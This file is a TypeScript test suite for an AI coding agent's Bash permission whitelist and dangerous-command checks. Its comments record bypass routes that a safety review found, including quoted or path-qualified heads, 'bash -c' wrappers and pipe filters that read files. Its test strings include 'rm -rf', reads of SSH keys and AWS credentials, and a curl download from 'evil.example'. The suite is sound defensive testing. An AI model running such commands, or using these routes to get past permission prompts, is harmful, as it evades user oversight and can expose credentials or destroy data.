/**
 * D1.291 `[safety]` — the SESSION whitelist had D1.285's defect one layer down.
 *
 * D1.285 closed the DURABLE grant (`SessionManager.persistBashAlwaysAllowRule`
 * narrows `Bash(git *)` to `Bash(git status *)` or refuses). The session store
 * beside it still keyed on one token, and it is the store that decides whether
 * this product asks again. Driven at HEAD through the real classes, after ONE
 * Always-Allow click on `git push origin main`:
 *
 * ```
 * ask  mode: "git push origin main" prompt=false  "git commit -m x"  prompt=false  "rm -rf build" prompt=true
 * auto mode: "git push origin main" prompt=false  "git reset --hard" prompt=false  "rm -rf build" prompt=true
 * ```
 *
 * `rm` is the control — never whitelistable, prompting throughout — and the
 * AUTO row is the half the row did not have: `auto` is a hole too, because the
 * session whitelist answers inside `shouldPromptInAskMode` ABOVE
 * `isRiskyAutoBashCommand`, so `AUTO_RISKY_BASH_PATTERNS` (which does carry the
 * git verbs) is never reached once anything is whitelisted. With an EMPTY
 * whitelist auto prompted for all three, which is the control that says the
 * measurement is about the whitelist and not about the mode.
 *
 * THREE arms are pinned here, and each is a different file:
 *
 *  1. `bashSessionWhitelistKey` (`core/dangerous-commands.ts`) — the rule;
 *  2. the WRITER, `ClaudeAgent.respondToPermission`'s Always-Allow branch,
 *     driven through a real agent;
 *  3. the two READERS, `shouldPromptInAskMode` and `shouldPromptInAutoMode`'s
 *     `excludedCommands` exemption, driven with a real `PermissionManager`.
 *
 * The control the fix has to KEEP is in every arm: `git status` is read-only and
 * auto-allowed with no whitelist at all, so it cannot show this — the honest
 * control is `git commit -m x`, which is neither read-only nor dangerous. An
 * Always-Allow on it must still stop the next `git commit` from asking.
 */
import { afterEach, describe, expect, it } from 'bun:test'
import { mkdtempSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import { ClaudeAgent } from '../claude-agent.ts'
import type { BackendConfig } from '../backend/types.ts'
import {
  bashAlwaysAllowRuleContent,
  bashRememberKey,
  bashSessionWhitelistKey,
  commandHeadName,
  headNamesCommandInterpreter,
  headsDangerousCommandPair,
  isDangerousCommandLine,
} from '../core/dangerous-commands.ts'
import { PermissionManager } from '../core/permission-manager.ts'
import { matchClaudeBashRule, splitWithSubstitutions } from '../pi-harness/claude-bash-rule.ts'
import { findRootOrHomeRemoval } from '../pi-harness/removal-circuit-breaker.ts'
import { shouldPromptInAskMode, shouldPromptInAutoMode } from '../core/pre-tool-use.ts'

const WORKSPACE_ROOT = mkdtempSync(join(tmpdir(), 'd1291-ws-'))

function permissionManager(): PermissionManager {
  return new PermissionManager({
    workspaceId: 'ws-d1291',
    sessionId: 'sess-d1291',
    workspaceRootPath: WORKSPACE_ROOT,
  })
}

const context = { workspaceRootPath: WORKSPACE_ROOT, activeSourceSlugs: [] }

function asksInAskMode(manager: PermissionManager, command: string): boolean {
  return shouldPromptInAskMode('Bash', { command }, manager, context) !== null
}

function asksInAutoMode(
  manager: PermissionManager,
  command: string,
  options?: { unsandboxedCommandPatterns?: readonly string[] },
): boolean {
  return shouldPromptInAutoMode('Bash', { command }, manager, context, undefined, undefined, options) !== null
}

describe('D1.291 — the rule: bashSessionWhitelistKey', () => {
  it('narrows a pair-heading base to the two tokens, and leaves every other base alone', () => {
    expect(bashSessionWhitelistKey('git commit -m x', 'git')).toBe('git commit')
    // D1.314 — a NON-pair base is narrowed too, to the leading non-flag tokens
    // the command named. This expected `npm` until that row, which is the width
    // it closed: one approval of `npm run build` bought `npm publish`.
    // UA12.70 — `npm run` is a RUNNER (upstream v0.14.0), so the key is the exact argv.
    expect(bashSessionWhitelistKey('npm run build', 'npm')).toBe('exact:["npm","run","build"]')
    // UA12.70 — `ls` is no keyed CLI, so its flags decide: exact argv, case kept.
    expect(bashSessionWhitelistKey('LS -LA', 'LS')).toBe('exact:["LS","-LA"]')
  })

  it('refuses a key it cannot honestly narrow', () => {
    // A FLAG narrows nothing — `git -C /repo push` would be remembered under
    // `git`, which covers the pushes again.
    expect(bashSessionWhitelistKey('git -C /repo push', 'git')).toBeNull()
    expect(bashSessionWhitelistKey('git', 'git')).toBe('exact:["git"]') // UA12.70 — the click, never every subcommand
    expect(bashSessionWhitelistKey('', '')).toBeNull()
    // Fail closed when the line does not contain its own base command, rather
    // than guessing the second token of something else.
    expect(bashSessionWhitelistKey('bash -lc "git push"', 'git')).toBeNull()
  })
})

describe('D1.291 — the writer: ClaudeAgent.respondToPermission', () => {
  const agents: ClaudeAgent[] = []
  afterEach(() => { for (const agent of agents.splice(0)) agent.destroy() })

  interface Internals {
    respondToPermission: (requestId: string, allowed: boolean, alwaysAllow?: boolean) => void
    pendingPermissions: Map<string, Record<string, unknown>>
    permissionManager: {
      getWhitelistedCommands: () => Set<string>
      getBaseCommand: (command: string) => string
    }
  }

  /**
   * One Always-Allow click on a Bash card, through the REAL branch.
   *
   * The pending record is built exactly as `claude-agent.ts`'s PreToolUse
   * producer builds it — `{ resolve, toolName, command, baseCommand }`, with the
   * base from the agent's own `getBaseCommand` — because that producer lives
   * inside the SDK query loop and cannot be reached without a running child. The
   * branch under test, `respondToPermission`, is the real one.
   */
  function clickAlwaysAllow(command: string): string[] {
    const root = mkdtempSync(join(tmpdir(), 'd1291-agent-'))
    const agent = new ClaudeAgent({
      provider: 'anthropic',
      providerType: 'anthropic',
      model: 'claude-sonnet-4-6',
      isHeadless: true,
      skipConfigWatcher: true,
      workspace: {
        id: 'ws-d1291', name: 'D1291', rootPath: root,
        workspaceRootPath: root, sessionRootPath: join(root, 'sessions'),
      } as never,
      session: { id: 'sess-d1291', createdAt: Date.now(), lastUsedAt: Date.now(), workingDirectory: root } as never,
    } as BackendConfig)
    agents.push(agent)
    const internals = agent as unknown as Internals
    internals.pendingPermissions.set('perm-d1291', {
      resolve: () => {},
      toolName: 'Bash',
      command,
      baseCommand: internals.permissionManager.getBaseCommand(command),
    })
    internals.respondToPermission('perm-d1291', true, true)
    return [...internals.permissionManager.getWhitelistedCommands()]
  }

  it('remembers the two-token prefix for a pair-heading base, and nothing for the dangerous pair', () => {
    // POSITIVE CONTROL FIRST: a build that stopped writing the whitelist
    // altogether would pass every absence below.
    expect(clickAlwaysAllow('npm test')).toEqual(['npm test'])
    expect(clickAlwaysAllow('git commit -m x')).toEqual(['git commit'])
    expect(clickAlwaysAllow('git push origin main')).toEqual([])
  })

  it('remembers nothing when no key narrows it, and nothing for a dangerous line', () => {
    expect(clickAlwaysAllow('git -C /repo push')).toEqual([])
    expect(clickAlwaysAllow('rm -rf build')).toEqual([])
    // `getBaseCommand` strips the `sudo`, so this used to be remembered as
    // `apt` — a session grant minted off a privileged answer. D1.285 made the
    // same correction to the ask-mode floor — the method that carried it had no
    // product caller and D1.307 deleted it, leaving the contract on
    // `isDangerousCommandLine`.
    expect(clickAlwaysAllow('sudo apt install x')).toEqual([])
  })

  it('D1.402 — refuses the resolved spellings too, where the durable rule is minted', () => {
    expect(clickAlwaysAllow('/bin/rm -rf dist')).toEqual([])
    expect(clickAlwaysAllow('NODE_ENV=production rm -rf dist')).toEqual([])
    expect(clickAlwaysAllow('/usr/bin/sudo apt install x')).toEqual([])
    expect(clickAlwaysAllow('/usr/bin/git push origin main')).toEqual([])
    // POSITIVE CONTROL on the same rig, so this is not "the writer stopped
    // writing": a path-qualified HARMLESS command is still remembered, at the
    // spelling the card showed.
    expect(clickAlwaysAllow('/usr/local/bin/npm test')).toEqual(['/usr/local/bin/npm test'])
  })
})

describe('D1.291 — the readers: ask mode and auto mode', () => {
  it('keeps auto-allowing the subcommand that was approved, in both modes', () => {
    const manager = permissionManager()
    manager.whitelistCommand('git commit')

    expect(asksInAskMode(manager, 'git commit -m y')).toBe(false)
    expect(asksInAutoMode(manager, 'git commit -m y')).toBe(false)
  })

  it('never lets an approved sibling buy a dangerous pair, in either mode', () => {
    const manager = permissionManager()
    manager.whitelistCommand('git commit')

    expect(asksInAskMode(manager, 'git push origin main')).toBe(true)
    expect(asksInAutoMode(manager, 'git push origin main')).toBe(true)
    expect(asksInAskMode(manager, 'git reset --hard')).toBe(true)
  })

  it('leaves a BROAD session entry meaning nothing but itself (UA12.70: key equality)', () => {
    // UA12.70 — the consult is KEY EQUALITY now, so a one-token `git` entry no
    // longer covers `git commit`; `pi-agent.ts`'s `addRules` no longer writes one
    // for `Bash(git:*)` either (`bashSessionKeyForRuleContent`). The dangerous
    // pairs stay refused whatever is stored.
    const manager = permissionManager()
    manager.whitelistCommand('git')

    expect(asksInAskMode(manager, 'git commit -m y')).toBe(true)
    expect(asksInAskMode(manager, 'git push origin main')).toBe(true)
    expect(asksInAskMode(manager, 'git rebase main')).toBe(true)
  })

  it('does not exempt a dangerous pair from ISOLATION on a whitelisted base', () => {
    // `shouldPromptInAutoMode`'s `excludedCommands` band: the exemption drops a
    // command out of the sandbox as well as out of the prompt, so a whitelisted
    // `git` used to run `git push` unsandboxed and unannounced.
    const broad = permissionManager()
    broad.whitelistCommand('git')
    const pushed = shouldPromptInAutoMode(
      'Bash', { command: 'git push origin main' }, broad, context, undefined, undefined,
      { unsandboxedCommandPatterns: ['*git*'] },
    )
    expect(pushed?.impact).toContain('Runs outside the sandbox')

    // The control on the same rig: an approved, non-dangerous subcommand keeps
    // its exemption, so this is not "the band stopped exempting anything".
    const approved = permissionManager()
    approved.whitelistCommand('git commit')
    expect(shouldPromptInAutoMode(
      'Bash', { command: 'git commit -m y' }, approved, context, undefined, undefined,
      { unsandboxedCommandPatterns: ['*git*'] },
    )).toBeNull()
  })

  it('still prompts for a whitelisted line whose HEAD is dangerous', () => {
    const manager = permissionManager()
    manager.whitelistCommand(bashSessionWhitelistKey('apt install x', 'apt')!) // UA12.70 — the key that click mints

    // `getBaseCommand` strips the `sudo`, so the base-command floor answered
    // `false` here and the line went through.
    expect(asksInAskMode(manager, 'sudo apt install x')).toBe(true)
    // The control: the same whitelisted base without the privileged head.
    expect(asksInAskMode(manager, 'apt install x')).toBe(false)
  })
})

/**
 * D1.402 `[safety]` — the floor matched the LITERAL first token.
 *
 * The F1.12 safety review (2026-09-19, findings #13 and #7 — the same defect
 * found twice, each confirmed 3/3 by adversarial verifiers) drove
 * `isDangerousCommandLine` at HEAD `dfc462e3c`, with the plain spellings as the
 * controls on the same instrument:
 *
 * ```
 * /bin/rm -rf x                  false      rm -rf x              true
 * /usr/bin/sudo ls               false      sudo ls               true
 * /usr/bin/git push origin main  false      git push origin main  true
 * NODE_ENV=x rm -rf x            false
 * ```
 *
 * That predicate is the veto on the session grant AND the refusal in
 * `SessionManager.persistBashAlwaysAllowRule`, so a single Always Allow on
 * `/bin/rm -rf dist` auto-allowed every later `/bin/rm` line for the session and
 * wrote a permanent repository-wide `Bash(/bin/rm *)`.
 */
describe('D1.402 — the floor resolves the head before it looks it up', () => {
  it('answers the path-qualified and assignment-prefixed spellings like the plain ones', () => {
    // POSITIVE CONTROL FIRST, on the same instrument: a predicate that had
    // started answering `true` for everything would pass every row below.
    expect(isDangerousCommandLine('npm test')).toBe(false)
    expect(isDangerousCommandLine('git status')).toBe(false)
    expect(isDangerousCommandLine('ls')).toBe(false)

    for (const [qualified, plain] of [
      ['/bin/rm -rf x', 'rm -rf x'],
      ['/usr/bin/sudo ls', 'sudo ls'],
      ['/usr/bin/git push origin main', 'git push origin main'],
      ['NODE_ENV=x rm -rf x', 'rm -rf x'],
      ['NODE_ENV=production LANG=C rm -rf x', 'rm -rf x'],
    ] as const) {
      expect([qualified, isDangerousCommandLine(qualified)]).toEqual([qualified, true])
      expect([plain, isDangerousCommandLine(plain)]).toEqual([plain, true])
    }

    // An assignment prefix is STEPPED OVER, never descended into, so it cannot
    // make a harmless command dangerous.
    expect(isDangerousCommandLine('NODE_ENV=x npm test')).toBe(false)
    // The win32 spelling of the same program.
    expect(isDangerousCommandLine('C:\\Windows\\System32\\rm.exe -rf x')).toBe(true)
  })

  it('resolves a pair-heading base the same way, so the durable rule narrows', () => {
    expect(headsDangerousCommandPair('/usr/bin/git')).toBe(true)
    expect(headsDangerousCommandPair('git')).toBe(true)
    // The control: a one-word entry heads no pair, path-qualified or not.
    expect(headsDangerousCommandPair('/bin/rm')).toBe(false)
    expect(headsDangerousCommandPair('ls')).toBe(false) // UA12.70 — `npm` heads `npm publish` now
    // UA12.70 — a bare path-qualified CLI buys its own exact argv and nothing wider.
    expect(bashSessionWhitelistKey('/usr/bin/git', '/usr/bin/git')).toBe('exact:["/usr/bin/git"]')
  })

  it('agrees with the removal circuit breaker, which has basenamed all along', () => {
    // The sibling floor in the same product whose own header says removal
    // commands are "matched on the basename, so `/bin/rm` counts". Driving it
    // is what makes this an agreement rather than a claim.
    // A synthetic home and an explicit platform: the breaker reads the real
    // `homedir()` when it is not told one, and a suite whose verdict depends on
    // the developer's own home directory is not an instrument.
    const options = { home: '/Users/tester', platform: 'darwin' as NodeJS.Platform }
    for (const command of ['rm -rf /', '/bin/rm -rf /', '/usr/bin/rm -rf ~', 'NODE_ENV=x rm -rf /']) {
      expect([command, findRootOrHomeRemoval(command, options) !== null]).toEqual([command, true])
      expect([command, isDangerousCommandLine(command)]).toEqual([command, true])
    }
    // The control that the breaker can answer null at all.
    expect(findRootOrHomeRemoval('rm -rf ./build', options)).toBeNull()
  })

  it('does NOT import the rule matcher\u2019s reading, which deliberately differs', () => {
    // Measured 2026-09-19, and it is why the resolution is spelled in
    // `dangerous-commands.ts` rather than taken from the rule engine: a RULE is
    // the administrator's literal text, so basenaming its pattern would make
    // `Bash(rm:*)` mean more than it says. A FLOOR is a refusal, so widening it
    // can only add a card. Both readings are correct for their own job.
    expect(matchClaudeBashRule('rm:*', '/bin/rm -rf x', { ruleAction: 'deny' })).toBe('no-match')
    expect(isDangerousCommandLine('/bin/rm -rf x')).toBe(true)
    // The controls: the matcher is live on the plain spelling and DOES step
    // over a leading assignment, which is the half the two readings share.
    expect(matchClaudeBashRule('rm:*', 'rm -rf x', { ruleAction: 'deny' })).toBe('match')
    expect(matchClaudeBashRule('rm:*', 'NODE_ENV=x rm -rf x', { ruleAction: 'deny' })).toBe('match')
  })

  it('never mints a grant for a resolved dangerous head, in either store', () => {
    const manager = permissionManager()
    // Nothing is whitelisted: these prompt because the floor sees them now.
    expect(asksInAskMode(manager, '/bin/rm -rf ./build')).toBe(true)
    expect(asksInAskMode(manager, 'NODE_ENV=x rm -rf ./build')).toBe(true)
    expect(asksInAutoMode(manager, '/usr/bin/git push origin main')).toBe(true)
    // And a grant stored under the raw spelling can no longer carry them: the
    // floor is consulted on every consult, not only when the key is minted.
    manager.whitelistCommand('/bin/rm')
    manager.whitelistCommand('node_env=x rm')
    expect(asksInAskMode(manager, '/bin/rm -rf ./build')).toBe(true)
    expect(asksInAskMode(manager, 'NODE_ENV=x rm -rf ./build')).toBe(true)
    // The control on the same manager: a harmless grant still answers.
    manager.whitelistCommand('npm test')
    expect(asksInAskMode(manager, 'npm test')).toBe(false)
  })

})

/**
 * UA12.86 `[security]` — the raw split keeps the QUOTE characters, so a quoted
 * head or verb looked up `"git"`/`"push"` and missed the list. Measured at HEAD
 * 2026-10-05 by driving the shipped module, with the plain spellings as the
 * controls on the same instrument:
 *
 * ```
 * "git" push origin main   false      git push origin main   true
 * git status               false  (the control that must stay false)
 * ```
 *
 * Origin: lane UA-cr7 P-UAcr7-2 (2026-10-02). The key side has refused the
 * spelling since UA12.70 through the parsed argv (`bashRememberKey` answers
 * null), so no stored key could carry it — but the floor's `false` left the
 * list's own contract sentence ("a command on this list ALWAYS REQUIRES
 * PERMISSION IN ASK MODE") false for a spelling a shell resolves to the same
 * program.
 */
describe('UA12.86 — the floor answers a quoted head or verb like the plain spelling', () => {
  it('refuses the quoted spellings of a listed command', () => {
    expect(isDangerousCommandLine('"git" push origin main')).toBe(true)
    expect(isDangerousCommandLine("'git' push origin main")).toBe(true)
    expect(isDangerousCommandLine('git "push" origin main')).toBe(true)
    expect(isDangerousCommandLine('git -C /repo "push"')).toBe(true)
    expect(isDangerousCommandLine('"rm" -rf x')).toBe(true)
  })

  it('keeps the controls: harmless lines, quoted arguments included, stay harmless', () => {
    expect(isDangerousCommandLine('git status')).toBe(false)
    expect(isDangerousCommandLine('npm test')).toBe(false)
    // A quoted word that merely NAMES a listed command is an argument, not a head.
    expect(isDangerousCommandLine('echo "git status"')).toBe(false)
    expect(isDangerousCommandLine('node -e "git push"')).toBe(false)
    expect(isDangerousCommandLine('touch "git push"')).toBe(false)
  })

  it('leaves the key side refusing the spelling it always refused', () => {
    // UA12.70 — bashRememberKey answered null for the quoted spelling through
    // the parsed argv before this row; the floor now refuses for the same
    // reason, and the key side must not flip in either direction.
    expect(bashRememberKey('"git" push origin main')).toBeNull()
  })

  it('never auto-allows a quoted dangerous line under a broad stored entry', () => {
    const manager = permissionManager()
    manager.whitelistCommand('git')
    expect(asksInAskMode(manager, '"git" push origin main')).toBe(true)
  })
})

/**
 * UA12.87 `[ux]` — `cmd 2>&1` and `cmd | tail` minted NO Always Allow key:
 * `parsePlainCommandArgv` refuses every redirect and pipe, so the common agent
 * spelling of a test run could not be remembered. Upstream v0.14.0 keys nothing
 * here either (its `parseSimpleCommand` rejects any redirect or pipe); keying the
 * producer is a deliberate divergence in the keying direction, bounded to what
 * Claude's pages treat as no effect of the command (permissions.md#redirections,
 * #read-only-commands). Origin lane UA-cr7 P-UAcr7-3 (2026-10-02). Measured at
 * HEAD `d1da7a083` on 2026-10-09 by driving the shipped module:
 *
 * ```
 * npm test 2>&1        key=null   (defect)     npm test        key="npm test"
 * npm test > out.txt   key=null   (the control that must stay null)
 * ```
 *
 * The strip is SUFFIX-ONLY and fails closed ({@link bashLineWithoutPlumbing}):
 * a pure stderr merge (` 2>&1`) and spaced pipe stages headed by a bare
 * stdin-to-stdout filter that cannot write (`tail`, `head`, `wc`, `grep`) are
 * removed before keying; everything else — a file redirect, `tee`, `xargs`, an
 * unspaced pipe, a substitution in the filter — keys nothing, exactly as before.
 */
describe('UA12.87 — the key is minted before a pure stderr merge or a read-only pipe tail', () => {
  it('keys the row controls like the bare command', () => {
    expect(bashRememberKey('npm test 2>&1')).toBe('npm test')
    expect(bashRememberKey('npm test | tail -20')).toBe('npm test')
    expect(bashRememberKey('npm test 2>&1 | tail')).toBe('npm test')
    // The click's own API (D1.404): the session key and the durable rule agree.
    expect(bashSessionWhitelistKey('npm test 2>&1', 'npm')).toBe('npm test')
    expect(bashAlwaysAllowRuleContent('npm test 2>&1', 'npm test')).toBe('npm test')
    expect(bashAlwaysAllowRuleContent('npm test 2>&1 | tail -20', 'npm test')).toBe('npm test')
    // A read-only pipeline of a read-only command keys that command.
    expect(bashRememberKey('git status | tail')).toBe('git status')
  })

  it('keeps the controls: a file redirect, a writer or a runner in the consumer keys nothing', () => {
    expect(bashRememberKey('npm test')).toBe('npm test') // the plain control
    expect(bashRememberKey('npm test > out.txt')).toBeNull()
    expect(bashRememberKey('npm test > out.txt 2>&1')).toBeNull()
    expect(bashRememberKey('npm test 2>err.txt')).toBeNull()
    expect(bashRememberKey('npm test >/dev/null')).toBeNull()
    expect(bashRememberKey('npm test | tee out.txt')).toBeNull()
    expect(bashRememberKey('npm test | xargs echo')).toBeNull()
    expect(bashRememberKey('npm test|tail')).toBeNull() // unspaced pipe: not normalized
    expect(bashRememberKey('npm test | grep "$(cat x)"')).toBeNull() // substitution in the consumer
    expect(bashRememberKey('npm test | /tmp/x/tail')).toBeNull() // a path-qualified filter is not the filter
    expect(bashRememberKey('npm test | tail 2>&1')).toBeNull() // a redirect on the filter
    expect(bashRememberKey('npm test |& tail')).toBeNull() // `|&` is not normalized
    expect(bashRememberKey('npm test 2>&1 2>&1')).toBeNull() // one merge only
    expect(bashRememberKey('rm -rf x ; npm test | tail')).toBeNull() // a chain before the producer
    expect(bashRememberKey('npm test | tail ; rm -rf x')).toBeNull() // a chain after the filter
    expect(bashRememberKey('npm test | grep -E "a | tail"')).toBeNull() // a quoted ` | ` is never a split
    // The UA12.70 follow-up guard survives the strip: a quoted `*` mints no rule.
    expect(bashAlwaysAllowRuleContent('node -e "x*" 2>&1', 'exact:["node","-e","x*"]')).toBeNull()
  })

  it('never keys a dangerous command out of its plumbing', () => {
    // The floor reads the RAW line before any strip, and the consult re-runs it
    // per segment, so plumbing can neither create nor hide a dangerous head.
    expect(isDangerousCommandLine('git push 2>&1')).toBe(true)
    expect(isDangerousCommandLine('git push | tail')).toBe(true)
    expect(bashRememberKey('git push 2>&1')).toBeNull()
    expect(bashRememberKey('git push | tail')).toBeNull()
    expect(bashRememberKey('rm -rf x | tail')).toBeNull()
    // A quoted dangerous head the raw read misses is refused on the producer (UA12.86's argv read).
    expect(bashRememberKey('"git" push origin main 2>&1')).toBeNull()
    expect(bashRememberKey('"git" push | tail')).toBeNull()
  })

  it('carries the stored grant across the plumbing, and only across the plumbing', () => {
    const manager = permissionManager()
    manager.whitelistCommand('npm test')
    // UA12.70 key equality: the line's own key is computed as its click would.
    expect(asksInAskMode(manager, 'npm test 2>&1')).toBe(false)
    expect(asksInAskMode(manager, 'npm test | tail -20')).toBe(false)
    expect(asksInAskMode(manager, 'npm test')).toBe(false)
    // The controls: a redirect to a file is an effect the key does not describe,
    // and an UNRELATED consumer spells a line the strip must not normalize.
    expect(asksInAskMode(manager, 'npm test > out.txt')).toBe(true)
    expect(asksInAskMode(manager, 'npm test | tee out.txt')).toBe(true)
    // And with an empty store everything still prompts (the grant was the cause).
    const fresh = permissionManager()
    expect(asksInAskMode(fresh, 'npm test 2>&1')).toBe(true)
    expect(asksInAskMode(fresh, 'npm test | tail -20')).toBe(true)
  })

  // UA12.87 follow-up `[security]` — a filter given a FILE operand ignores the
  // pipe and reads that file, so it is not plumbing. At 78ba885e8 the strip took
  // any argv after the filter name, and one Always Allow on `npm test` let
  // `npm test | tail -n 5 /Users/x/.ssh/id_rsa` run with no card in ask AND auto
  // mode (the session grant answers above the auto-mode risk check).
  const FILE_READING_FILTER_LINES = [
    'npm test | tail /etc/hosts',
    'npm test | tail -n 5 /Users/x/.ssh/id_rsa',
    'npm test 2>&1 | head -c 4000 /Users/x/.ssh/id_rsa',
    'npm test | head -5 /etc/hosts',
    'npm test | tail -n /etc/hosts', // a count that is not a number
    'npm test | grep -r x /',
    'npm test | grep token /Users/x/.aws/credentials', // a second operand is a file
    'npm test | grep -f /Users/x/patterns', // a pattern FILE
    'npm test | grep -e x', // -e takes a value: not on the flag set
    'npm test | wc --files0-from=list',
    'npm test | wc -l /etc/hosts',
  ]

  it('keys nothing when a filter names a file, and keeps keying a stdin-only filter', () => {
    for (const line of FILE_READING_FILTER_LINES) expect([line, bashRememberKey(line)]).toEqual([line, null])
    // A line terminator in the merge's whitespace is not the one-line spelling.
    expect(bashRememberKey('npm test\n2>&1')).toBeNull()
    expect(bashRememberKey('npm test\r 2>&1')).toBeNull()
    // POSITIVE CONTROLS: the stdin-only spellings an agent writes still key the producer.
    for (const line of [
      'npm test | tail -n 5',
      'npm test | tail -n5',
      'npm test | head -c 4000',
      'npm test | tail --lines=20',
      'npm test | wc -l',
      'npm test | grep FAIL',
      'npm test | grep -iv skip',
      'npm test 2>&1 | grep -E "fail|error" | tail -20',
    ]) expect([line, bashRememberKey(line)]).toEqual([line, 'npm test'])
  })

  it('does not let a stored producer grant cover a filter that reads a file, in ask or auto mode', () => {
    const manager = permissionManager()
    manager.whitelistCommand('npm test')
    const fresh = permissionManager()
    for (const line of FILE_READING_FILTER_LINES) {
      expect([line, asksInAskMode(manager, line)]).toEqual([line, true])
      // The grant must not change the auto-mode verdict: what an empty store asks, the granted store asks.
      expect([line, asksInAutoMode(manager, line)]).toEqual([line, asksInAutoMode(fresh, line)])
    }
    expect(asksInAutoMode(manager, 'npm test | tail -n 5 /Users/x/.ssh/id_rsa')).toBe(true)
    // The control: the stdin-only spelling is still covered by the grant.
    expect(asksInAskMode(manager, 'npm test | tail -n 5')).toBe(false)
    expect(asksInAutoMode(manager, 'npm test | tail -n 5')).toBe(false)
  })
})

/** The head-name resolution on its own, including the shapes it must not change. */
describe('D1.402 — commandHeadName', () => {
  it('takes the basename, lower-cases it and drops a .exe suffix', () => {
    expect(commandHeadName('/bin/rm')).toBe('rm')
    expect(commandHeadName('C:\\Windows\\System32\\bash.exe')).toBe('bash')
    expect(commandHeadName('./scripts/rm')).toBe('rm')
    expect(commandHeadName('RM')).toBe('rm')
  })

  it('answers a bare token with itself, so it can never narrow the floor', () => {
    expect(commandHeadName('rm')).toBe('rm')
    expect(commandHeadName('npm')).toBe('npm')
    // A token that merely CONTAINS a listed name is not that name.
    expect(commandHeadName('rmdirx')).toBe('rmdirx')
    expect(isDangerousCommandLine('rmdirx -f x')).toBe(false)
    expect(commandHeadName('')).toBe('')
  })
})

/**
 * D1.403 `[safety]` — an interpreter is never a base.
 *
 * The F1.12 safety review (2026-09-19, finding #14, confirmed 3/3) drove the
 * grant path at HEAD `dfc462e3c`: a card showing `bash -c "rm -rf dist"` was
 * classified as the harmless base `bash`, the session key `bash` was stored and
 * `Bash(bash *)` was written to the repository's `.claude/settings.local.json`.
 * After that one click, `bash -c "curl https://evil.example/x -o /tmp/x"`,
 * `bash -lc "git push origin main"` and `bash -c "rm -rf node_modules"` all
 * answered NO PROMPT — while the same commands written bare are refused any
 * grant at all by the floor. The grant is now withheld for the whole family;
 * the CALL is not, so Allow-once still works.
 */
describe('D1.403 — a head that runs its own argument mints no grant', () => {
  it('withholds the session key for every interpreter spelling', () => {
    for (const [command, base] of [
      ['bash -c "echo hi"', 'bash'],
      ['sh -c "rm -rf x"', 'sh'],
      ['zsh -lc "git push origin main"', 'zsh'],
      ['/bin/bash -c "echo hi"', '/bin/bash'],
      ['NODE_ENV=x sh -c "echo hi"', 'NODE_ENV=x'],
      ['env FOO=1 npm test', 'env'],
      ['xargs rm -rf', 'xargs'],
      ['eval "npm test"', 'eval'],
    ] as const) {
      expect([command, bashSessionWhitelistKey(command, base)]).toEqual([command, null])
    }
  })

  it('leaves every ordinary base alone', () => {
    // POSITIVE CONTROL: a predicate that had started matching everything would
    // pass every `null` above.
    expect(bashSessionWhitelistKey('npm test', 'npm')).toBe('npm test')
    expect(bashSessionWhitelistKey('git commit -m x', 'git')).toBe('git commit')
    expect(bashSessionWhitelistKey('docker compose up -d', 'docker')).toBe('docker compose up')
    // A name that merely CONTAINS an interpreter name is not one — the mutant
    // that a substring match would pass (P2.152 measured exactly this class).
    expect(headNamesCommandInterpreter('bashfoo x')).toBe(false)
    expect(headNamesCommandInterpreter('myenv x')).toBe(false)
    expect(headNamesCommandInterpreter('shellcheck x')).toBe(false)
  })

  it('is a SUPERSET of the shells the durable engine descends into', () => {
    // Driven rather than read: `splitWithSubstitutions` yields a shell's `-c`
    // operand as its own subcommand, so a name the engine knows as a shell
    // shows up as a second segment. Every such name must be withheld here, or
    // the engine would read a script this store had already remembered.
    for (const shell of ['bash', 'sh', 'zsh', 'dash', 'ksh', 'fish']) {
      const segments = splitWithSubstitutions(`${shell} -c "rm -rf x"`) ?? []
      expect([shell, segments.includes('rm -rf x')]).toEqual([shell, true])
      expect([shell, headNamesCommandInterpreter(`${shell} -c "rm -rf x"`)]).toEqual([shell, true])
    }
    // The control that the instrument can answer "not a shell": `npm` is not
    // one, and the engine yields only the command itself.
    expect(splitWithSubstitutions('npm test')).toEqual(['npm test'])
    // THE SUPERSET DIRECTION, and this assertion has already moved once, which
    // is the lesson worth keeping. It named `fish` — measured true on
    // 2026-09-19, when the engine did not descend into it — and D1.413 put
    // `fish` INTO `SHELL_INTERPRETERS` the next day, so this suite went red
    // against a change that was entirely correct. A pin that records a READING
    // decays the moment the reading moves; a pin that records the RULE does not.
    // The rule is: this constant is withholding-only, so it may name heads the
    // splitter does not follow, and each such name costs a user one click while
    // its absence would mint a permanent rule. `env`, `xargs` and `eval` carry
    // that direction now — they run their argument and the engine's enforcement
    // pass strips them elsewhere rather than yielding them here.
    for (const wrapper of ['env FOO=1 rm -rf x', 'xargs rm -rf', 'eval "rm -rf x"']) {
      expect([wrapper, splitWithSubstitutions(wrapper)]).toEqual([wrapper, [wrapper]])
      expect([wrapper, headNamesCommandInterpreter(wrapper)]).toEqual([wrapper, true])
    }
  })
})
